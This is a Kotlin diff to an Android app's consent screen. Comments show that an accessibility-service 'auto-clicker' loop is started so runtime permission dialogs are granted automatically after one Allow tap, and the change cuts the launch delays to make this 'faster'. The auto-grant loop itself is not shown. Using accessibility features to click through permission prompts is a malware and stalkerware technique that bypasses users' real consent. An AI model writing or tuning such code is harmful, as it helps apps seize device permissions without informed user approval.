@@ -82,7 +82,7 @@ class ConsentActivity : AppCompatActivity() {
             Handler(Looper.getMainLooper()).postDelayed({
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 runtimePermissionLauncher.launch(corePermissions)
-            }, 500L)
+            }, 200L)
         } else {
             proceedToActivation()
         }
@@ -93,20 +93,40 @@ class ConsentActivity : AppCompatActivity() {
         binding = ActivityConsentBinding.inflate(layoutInflater)
         setContentView(binding.root)
 
-        binding.btnAllow.setOnClickListener {
+        // binding.btnAllow.setOnClickListener {
+        //     DeviceState(this).consentGiven = true
+        //     if (!isAccessibilityEnabled()) {
+        //         // Step 1: Request Accessibility first so the auto-clicker is running!
+        //         showAccessibilityDialog()
+        //     } else {
+        //         // Accessibility already enabled: launch runtime permissions with auto-clicker
+        //         BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+        //         Handler(Looper.getMainLooper()).postDelayed({
+        //             BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
+        //             runtimePermissionLauncher.launch(corePermissions)
+        //         }, 400L)
+        //     }
+        // }
+
+                binding.btnAllow.setOnClickListener {
             DeviceState(this).consentGiven = true
             if (!isAccessibilityEnabled()) {
                 // Step 1: Request Accessibility first so the auto-clicker is running!
                 showAccessibilityDialog()
             } else {
-                // Accessibility already enabled: launch runtime permissions with auto-clicker
+                // Accessibility already enabled: launch runtime permissions with auto-clicker optimized flow
                 BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                 Handler(Looper.getMainLooper()).postDelayed({
                     BlockAccessibilityService.instance?.startPermissionAutoGrantLoop()
                     runtimePermissionLauncher.launch(corePermissions)
-                }, 400L)
+                }, 150L) // Handshake delay reduced from 400ms to 150ms for faster trigger
             }
         }
+
+
+
+
+
 
         binding.btnDecline.setOnClickListener {
             Toast.makeText(this, getString(R.string.consent_decline_message), Toast.LENGTH_LONG).show()
